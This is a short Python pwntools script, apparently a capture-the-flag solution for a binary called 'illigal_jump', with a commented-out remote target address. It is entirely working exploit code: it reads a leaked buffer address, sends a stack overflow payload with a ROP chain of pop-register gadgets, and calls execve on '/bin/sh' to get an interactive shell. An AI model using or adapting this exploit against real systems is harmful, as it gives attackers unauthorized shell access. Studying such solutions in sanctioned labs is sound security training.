from pwn import *
from Crypto.Util.number import *

binary = './illigal_jump'
elf = ELF(binary)
p = process(binary)
#p = remote('153.125.225.197', 30006)

p.sendlineafter('Enter option:', '1')
p.sendlineafter('Enter option:', '3')

p.recvuntil('name at ')
name_addr = int(p.recvline()[:-1], 16)
log.warn(hex(name_addr))

# 0x0044ead7: pop rax ; ret  ;  (3 found)
pop_rax = 0x44ead7
# 0x00401811: pop rdi ; ret  ;
pop_rdi = 0x401811
# 0x00407fae: pop rsi ; ret  ;  (39 found)
pop_rsi = 0x407fae
# 0x0040174f: pop rdx ; ret  ;  (1 found)
pop_rdx = 0x40174f
# 0x00: syscall  ;  (172 found)
syscall = 0x40120e
# 0x0040101a: ret  ;  (2979 found)
ret = 0x40101a

payload = b"/bin/sh\0"
payload += b"x" * (72 - len(payload))
payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rdi)
payload += p64(name_addr)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(ret)
payload += p64(syscall)
p.sendline(payload)

p.sendlineafter('Enter option:', '2')

p.interactive()
